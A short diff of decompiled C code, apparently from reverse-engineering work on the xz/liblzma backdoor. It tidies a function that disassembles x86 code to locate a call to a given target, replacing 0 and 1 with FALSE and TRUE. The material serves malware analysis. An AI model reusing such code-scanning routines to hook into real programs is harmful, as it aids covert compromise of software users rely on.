@@ -23,7 +23,7 @@ BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_
   
   bVar5 = 0;
   BVar2 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x81,4,7);
-  if (BVar2 != 0) {
+  if (BVar2 != FALSE) {
     pdVar4 = &local_80;
     for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
       *(undefined4 *)&pdVar4->instruction = 0;
@@ -34,7 +34,7 @@ BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_
     }
     while (code_start < code_end) {
       BVar2 = x86_dasm(dctx,code_start,code_end);
-      if (BVar2 == 0) {
+      if (BVar2 == FALSE) {
         code_start = code_start + 1;
       }
       else {
@@ -45,12 +45,12 @@ BOOL find_call_instruction(u8 *code_start,u8 *code_end,u8 *call_target,dasm_ctx_
         if ((iVar1 == 0x168) &&
            ((call_target == (u8 *)0x0 ||
             (dctx->instruction + dctx->instruction_size + dctx->mem_disp == call_target)))) {
-          return 1;
+          return TRUE;
         }
         code_start = code_start + dctx->instruction_size;
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
